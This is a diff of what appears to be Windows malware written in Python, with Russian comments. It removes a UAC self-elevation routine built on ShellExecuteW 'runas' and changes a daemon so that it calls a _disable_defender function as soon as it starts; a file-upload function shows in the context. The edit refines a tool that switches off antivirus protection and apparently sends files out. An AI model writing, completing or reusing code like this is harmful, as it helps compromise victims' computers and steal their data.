@@ -76,25 +76,10 @@ def _upload_single(file_path):
     except: pass
     return None
 
-# ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ (UAC) ----
-def _elevate():
-    # Проверяем, уже ли мы админ
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        return True
-    # Если уже есть флаг --elevated, значит что-то пошло не так
-    if '--elevated' in sys.argv:
-        # Не удалось получить права, выходим с ошибкой
-        print("Не удалось получить права администратора")
-        sys.exit(1)
-    # Перезапускаем себя с правами администратора и добавляем флаг
-    script = os.path.abspath(sys.argv[0])
-    params = f'"{script}" --elevated'
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
-    return False
-
 # ---- ОТКЛЮЧЕНИЕ DEFENDER ----
 def _disable_defender():
     try:
+        # Мы уже админ, так что проверка не нужна, но оставим для безопасности
         if not ctypes.windll.shell32.IsUserAnAdmin():
             return 'not_admin'
         exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
@@ -540,20 +525,7 @@ class _Daemon:
         sys.exit(0)
 
     def run(self):
-        # ---- ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ----
-        if not ctypes.windll.shell32.IsUserAnAdmin():
-            # Если флаг --elevated уже есть, значит админ не получился
-            if '--elevated' in sys.argv:
-                print("❌ Не удалось получить права администратора")
-                sys.exit(1)
-            # Перезапускаем с правами
-            script = os.path.abspath(sys.argv[0])
-            params = f'"{script}" --elevated'
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
-            sys.exit(0)  # завершаем текущий процесс
-
-        # ---- ТЕПЕРЬ МЫ АДМИН ----
-        print("✅ Запущено с правами администратора")
+        # ---- СРАЗУ ОТКЛЮЧАЕМ DEFENDER (мы уже админ) ----
         def_status = _disable_defender()
         print(f"🛡️ Defender: {def_status}")
 
